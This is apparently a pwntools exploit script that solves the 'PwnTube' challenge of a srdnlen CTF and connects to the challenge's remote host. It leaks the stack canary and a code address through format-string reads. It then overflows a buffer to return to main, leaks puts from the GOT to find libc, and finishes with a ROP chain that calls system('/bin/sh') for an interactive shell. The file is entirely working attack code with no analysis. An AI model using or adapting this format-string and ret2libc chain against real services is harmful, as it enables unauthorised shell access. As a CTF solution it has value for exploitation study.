from pwn import *

elf = context.binary = ELF("./PwnTube", checksec=False)
libc = elf.libc

r = remote("pwntube.challs.srdnlen.it", 1661)
#r = process()

r.sendline(b"4")
r.sendline(b"%71$p") #canary

r.sendline(b"4")
r.sendline(b"%11$p") #main+850

r.sendline(b"3")

r.recvuntil(b":D\n")
canary = int(r.recvline()[:-1].decode(), 16)
main_leak = int(r.recvline()[:-1].decode(), 16)

offset = main_leak - 0x00101abd
elf.address = offset + 0x100000 

RET = p64(0x0010138d+offset)
POP_RDI = p64(0x001015aa+offset)
SYSTEM = p64(0x001011e7+offset)

r.sendline(b"777")
r.sendline(b"5")
r.sendline(b"2")

payload = b"A"*504 + p64(canary)*2 + RET + p64(elf.sym["main"])

#gdb.attach(r)
r.sendline(payload)
r.sendline(b"1")

'''
2nd execution, we now know canary and pie, need to leak aslr
'''

payload = b"A"*504 + p64(canary)*2 + POP_RDI + p64(elf.got["puts"]) +p64(elf.plt["puts"]) + RET*2 + p64(elf.sym["main"])

r.sendline(b"777")
r.sendline(b"5")
r.sendline(b"2")
r.sendline(payload)
r.clean()
r.sendline(b"ok")

data = r.recvuntil(b"broke\n")
data = r.recvline()
data = r.recvuntil(b"broke\n")
puts_leak = r.recvline()[:-1]

puts_leak = (u64(puts_leak+b"\x00\x00"))


libc.address = puts_leak - libc.sym["puts"]

'''
3rd exec, rop and gg
'''

binsh = next(libc.search(b'/bin/sh\x00'))


r.sendline(b"777")
r.sendline(b"5")
r.sendline(b"2")

payload = b"A"*504 + p64(canary)*2 + POP_RDI + p64(binsh) + SYSTEM

r.sendline(payload)
r.sendline(b"1")

#gdb.attach(r)

r.interactive()